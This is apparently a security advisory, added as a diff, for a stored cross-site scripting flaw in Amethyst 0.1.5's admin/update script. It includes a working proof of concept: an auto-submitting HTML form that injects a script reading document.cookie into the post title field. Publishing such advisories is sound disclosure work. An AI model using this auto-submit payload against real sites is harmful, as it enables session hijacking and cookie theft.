@@ -1,0 +1,40 @@
+Vulnerability ID: HTB22502
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_amethyst_2.html
+Product: Amethyst
+Vendor: Hulihan Applications ( http://hulihanapplications.com/projects/amethyst )
+Vulnerable Version: 0.1.5 and Probably Prior Versions
+Vendor Notification: 22 July 2010
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Fixed by Vendor
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the admin/update script to properly sanitize user-supplied input in "post[title]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/update/2" method="post" name="main" >
+
+<input type="hidden" name="post[title]" value='title"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="post[content]" value="this is my post" />
+<input type="hidden" name="post[created_at(1i)]" value="2010" />
+<input type="hidden" name="post[created_at(2i)]" value="7" />
+<input type="hidden" name="post[created_at(3i)]" value="15" />
+<input type="hidden" name="post[created_at(4i)]" value="20" />
+<input type="hidden" name="post[created_at(5i)]" value="39" />
+<input type="hidden" name="post[updated_at(1i)]" value="2010" />
+<input type="hidden" name="post[updated_at(2i)]" value="7" />
+<input type="hidden" name="post[updated_at(3i)]" value="15" />
+<input type="hidden" name="post[updated_at(4i)]" value="20" />
+<input type="hidden" name="post[updated_at(5i)]" value="39" />
+<input type="hidden" name="commit" value="Create" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+Solution: Upgrade to the most recent version
